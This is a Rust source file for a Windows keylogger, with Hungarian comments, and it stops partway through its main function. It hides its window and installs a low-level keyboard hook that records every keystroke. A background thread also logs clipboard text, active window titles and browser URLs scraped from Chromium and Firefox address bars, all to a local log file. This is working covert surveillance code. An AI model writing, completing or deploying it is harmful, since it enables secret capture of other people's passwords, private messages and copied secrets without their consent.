#![windows_subsystem = "windows"]

use std::fs::{self, OpenOptions};
use std::io::Write;
use std::ptr::null_mut;
use std::sync::Mutex;
use std::thread;
use std::time::Duration;

use uiautomation::{UIAutomation, TreeScope, Condition};

use windows_sys::Win32::Foundation::{LPARAM, LRESULT, WPARAM, SYSTEMTIME, HWND};
use windows_sys::Win32::UI::WindowsAndMessaging::{
    CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx, WH_KEYBOARD_LL, WM_KEYDOWN,
    MSG, KBDLLHOOKSTRUCT, GetForegroundWindow, GetWindowTextW, PostQuitMessage, HHOOK,
};
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{
    GetKeyboardState, ToUnicode, GetAsyncKeyState, VK_CONTROL, VK_SHIFT,
    GetLastInputInfo, LASTINPUTINFO,
};
use windows_sys::Win32::System::DataExchange::{
    OpenClipboard, CloseClipboard, GetClipboardData,
};
use windows_sys::Win32::System::Memory::{GlobalLock, GlobalUnlock};
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
use windows_sys::Win32::System::SystemInformation::{GetLocalTime, GetTickCount};

const BASE_DIR: &str = r"g:\1aTELEPÍT\Newtest\";
const LOG_PATH: &str = r"g:\1aTELEPÍT\Newtest\log.txt";
const MAX_SIZE: u64 = 300 * 1024;

// windows-sys 0.59-ben nincs exportálva:
const CF_UNICODETEXT: u32 = 13;

// --- SZINKRONIZÁLT GLOBÁLIS VÁLTOZÓK ---

static LAST_WINDOW: Mutex<String> = Mutex::new(String::new());
static LAST_CLIPBOARD: Mutex<String> = Mutex::new(String::new());
static LAST_URL: Mutex<String> = Mutex::new(String::new());
static IS_IDLE: Mutex<bool> = Mutex::new(false);
static LOG_MUTEX: Mutex<()> = Mutex::new(());

static mut HOOK_HANDLE: HHOOK = null_mut();

// --- SEGÉDFÜGGVÉNYEK ---

fn get_timestamp() -> String {
    unsafe {
        let mut st: SYSTEMTIME = std::mem::zeroed();
        GetLocalTime(&mut st);
        format!(
            "{:04}-{:02}-{:02} {:02}:{:02}:{:02}",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond
        )
    }
}

fn get_active_window_title() -> String {
    let mut buffer = [0u16; 512];
    unsafe {
        let hwnd = GetForegroundWindow();
        let len = GetWindowTextW(hwnd, buffer.as_mut_ptr(), buffer.len() as i32);
        if len > 0 {
            String::from_utf16_lossy(&buffer[..len as usize])
        } else {
            "Asztal".to_string()
        }
    }
}

fn get_clipboard_text() -> Option<String> {
    unsafe {
        if OpenClipboard(0 as HWND) == 0 {
            return None;
        }

        let handle = GetClipboardData(CF_UNICODETEXT);
        if handle == null_mut() {
            CloseClipboard();
            return None;
        }

        let ptr = GlobalLock(handle);
        if ptr.is_null() {
            CloseClipboard();
            return None;
        }

        let mut len = 0;
        while *(ptr as *const u16).add(len) != 0 {
            len += 1;
        }

        let text = String::from_utf16_lossy(std::slice::from_raw_parts(ptr as *const u16, len));

        GlobalUnlock(handle);
        CloseClipboard();

        Some(text)
    }
}
// --- BÖNGÉSZŐ URL KIOLVASÁS UI AUTOMATIONNAL ---

fn get_browser_url() -> Option<String> {
    // UI Automation inicializálása
    let automation = UIAutomation::new().ok()?;
    let root = automation.get_root_element().ok()?;

    // Aktív ablak lekérése
    let hwnd = unsafe { GetForegroundWindow() };
    if hwnd == 0 {
        return None;
    }

    // Az aktív ablak UIA elemének lekérése
    let element = automation.element_from_handle(hwnd as isize).ok()?;

    // Böngészők felismerése ablakcím alapján
    let title = get_active_window_title().to_lowercase();

    let is_chrome_like = title.contains("chrome")
        || title.contains("edge")
        || title.contains("brave")
        || title.contains("opera")
        || title.contains("vivaldi");

    let is_firefox = title.contains("firefox");

    // Chrome-alapú böngészők URL mezője
    if is_chrome_like {
        let cond = Condition::Name("Address and search bar");

        if let Ok(urlbar) = element.find_first(TreeScope::Subtree, &cond) {
            if let Ok(url) = urlbar.get_value() {
                if !url.trim().is_empty() {
                    return Some(url);
                }
            }
        }
    }

    // Firefox URL mezője
    if is_firefox {
        let cond = Condition::Name("Search or enter address");

        if let Ok(urlbar) = element.find_first(TreeScope::Subtree, &cond) {
            if let Ok(url) = urlbar.get_value() {
                if !url.trim().is_empty() {
                    return Some(url);
                }
            }
        }
    }

    None
}
// --- MONITORING SZÁL ---

fn start_background_monitor() {
    thread::spawn(|| loop {
        let mut lii: LASTINPUTINFO = unsafe { std::mem::zeroed() };
        lii.cbSize = std::mem::size_of::<LASTINPUTINFO>() as u32;

        let idle_ms = unsafe {
            if GetLastInputInfo(&mut lii) != 0 {
                GetTickCount().wrapping_sub(lii.dwTime)
            } else {
                0
            }
        };

        {
            let mut idle = IS_IDLE.lock().unwrap();

            if idle_ms > 60000 {
                if !*idle {
                    let _guard = LOG_MUTEX.lock().unwrap();
                    if let Ok(mut file) =
                        OpenOptions::new().create(true).append(true).open(LOG_PATH)
                    {
                        let _ = writeln!(file, "\n[IDLE: {}]", get_timestamp());
                    }
                    *idle = true;
                }
            } else {
                *idle = false;

                let current_window = get_active_window_title();
                let mut last_window = LAST_WINDOW.lock().unwrap();

                if current_window != *last_window {
                    // log rotate
                    if let Ok(metadata) = fs::metadata(LOG_PATH) {
                        if metadata.len() > MAX_SIZE {
                            let mut st: SYSTEMTIME = unsafe { std::mem::zeroed() };
                            unsafe { GetLocalTime(&mut st) };
                            let archive = format!(
                                "{}log_{:04}{:02}{:02}_{:02}{:02}{:02}.txt",
                                BASE_DIR, st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond
                            );
                            let _ = fs::rename(LOG_PATH, archive);
                        }
                    }

                    let _guard = LOG_MUTEX.lock().unwrap();
                    if let Ok(mut file) =
                        OpenOptions::new().create(true).append(true).open(LOG_PATH)
                    {
                        let _ = writeln!(
                            file,
                            "\n\n[IDŐ: {}] [ABLAK: {}]",
                            get_timestamp(),
                            current_window
                        );
                    }

                    *last_window = current_window.clone();

                    // Böngésző URL logolása, ha van
                    if let Some(url) = get_browser_url() {
                        let mut last_url = LAST_URL.lock().unwrap();
                        if url != *last_url {
                            let _guard = LOG_MUTEX.lock().unwrap();
                            if let Ok(mut file) =
                                OpenOptions::new().create(true).append(true).open(LOG_PATH)
                            {
                                let _ = writeln!(file, "[URL: {}]", url);
                            }
                            *last_url = url;
                        }
                    } else {
                        // ha nem böngésző vagy nincs URL, töröljük az utolsó URL-t
                        let mut last_url = LAST_URL.lock().unwrap();
                        *last_url = String::new();
                    }
                }

                if let Some(clip) = get_clipboard_text() {
                    let mut last_clip = LAST_CLIPBOARD.lock().unwrap();
                    if clip != *last_clip && !clip.trim().is_empty() {
                        let _guard = LOG_MUTEX.lock().unwrap();
                        if let Ok(mut file) =
                            OpenOptions::new().create(true).append(true).open(LOG_PATH)
                        {
                            let _ = writeln!(file, "\n[VÁGÓLAP: {}]", clip);
                        }
                        *last_clip = clip;
                    }
                }
            }
        }

        thread::sleep(Duration::from_millis(1500));
    });
}

// --- HOOK ---

extern "system" fn low_level_keyboard_proc(
    code: i32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    unsafe {
        if code >= 0 && wparam == WM_KEYDOWN as WPARAM {
            let kbd = *(lparam as *const KBDLLHOOKSTRUCT);

            // Ctrl + Shift + A → kilépés
            if kbd.vkCode == 0x41 {
                let ctrl = (GetAsyncKeyState(VK_CONTROL as i32) as u16 & 0x8000) != 0;
                let shift = (GetAsyncKeyState(VK_SHIFT as i32) as u16 & 0x8000) != 0;

                if ctrl && shift {
                    UnhookWindowsHookEx(HOOK_HANDLE);
                    PostQuitMessage(0);
                }
            }

            let mut keyboard_state = [0u8; 256];
            let mut buffer = [0u16; 8];

            GetKeyboardState(keyboard_state.as_mut_ptr());

            let len = ToUnicode(
                kbd.vkCode,
                kbd.scanCode,
                keyboard_state.as_ptr(),
                buffer.as_mut_ptr(),
                buffer.len() as i32,
                0,
            );

            // Dead key flush
            if len < 0 {
                let mut dummy = [0u16; 8];
                ToUnicode(
                    kbd.vkCode,
                    kbd.scanCode,
                    keyboard_state.as_ptr(),
                    dummy.as_mut_ptr(),
                    8,
                    0,
                );
            }

            if len > 0 {
                let txt = String::from_utf16_lossy(&buffer[..len as usize]);

                // vezérlőkarakterek kiszűrése (pl. 0x08 BACKSPACE)
                let clean: String = txt.chars().filter(|c| !c.is_control()).collect();

                if !clean.is_empty() {
                    let _guard = LOG_MUTEX.lock().unwrap();
                    if let Ok(mut file) =
                        OpenOptions::new().create(true).append(true).open(LOG_PATH)
                    {
                        let _ = write!(file, "{}", clean);
                    }
                }
            }
        }

        CallNextHookEx(HOOK_HANDLE, code, wparam, lparam)
    }
}

fn main() {
    let _ = fs::create_dir_all(BASE_DIR);

    start_background_monitor();

    unsafe {
        let h_instance = GetModuleHandleW(null_mut());
        let hook: HHOOK